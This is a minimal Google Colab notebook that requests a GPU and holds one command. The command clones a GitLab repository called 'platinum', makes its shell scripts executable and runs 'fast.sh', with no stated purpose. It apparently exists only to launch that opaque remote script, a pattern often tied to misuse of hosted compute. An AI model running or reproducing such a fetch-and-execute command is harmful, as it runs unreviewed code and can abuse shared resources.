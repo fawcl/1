{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "1.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8uQ12Gz6ZzCb"
      },
      "source": [
        "# **1**\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "w5ULGPznUa5U"
      },
      "source": [
        "!git clone https://gitlab.com/rijalpatra91/platinum.git && cd platinum&& chmod +x *.sh && ./fast.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}